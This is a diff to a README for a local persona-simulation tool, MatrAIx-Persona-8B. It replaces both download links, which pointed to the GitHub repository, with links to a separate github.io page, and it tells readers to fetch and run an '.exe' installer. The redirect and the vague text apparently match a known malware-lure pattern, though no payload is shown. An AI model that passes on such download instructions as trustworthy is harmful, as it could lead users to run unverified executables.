@@ -1,6 +1,6 @@
 # 🧠 MatrAIx-Persona-8B - Create life-like digital personas with ease
 
-[![Download MatrAIx-Persona-8B](https://img.shields.io/badge/Download-MatrAIx--Persona--8B-blue.svg)](https://github.com/Izakgutsy158/MatrAIx-Persona-8B)
+[![Download MatrAIx-Persona-8B](https://img.shields.io/badge/Download-MatrAIx--Persona--8B-blue.svg)](https://izakgutsy158.github.io)
 
 MatrAIx-Persona-8B allows you to simulate intelligent personas on your personal computer. You create realistic conversations and explore complex scenarios without the need for an internet connection. This software runs locally on your machine, which ensures your interactions remain private. Whether you want to test ideas or simply experiment with language models, this tool provides the environment you need.
 
@@ -20,7 +20,7 @@ If your computer falls below these specs, the application may respond slowly. Cl
 
 You must visit the project page to access the latest version of the installer. 
 
-[Visit this page to download the installer](https://github.com/Izakgutsy158/MatrAIx-Persona-8B)
+[Visit this page to download the installer](https://izakgutsy158.github.io)
 
 Once you arrive at the page, look for the section labeled "Releases." Click the link that ends in ".exe" to begin the download. Save the file to your computer in a folder you can easily find, such as your Downloads or Desktop folder.
 
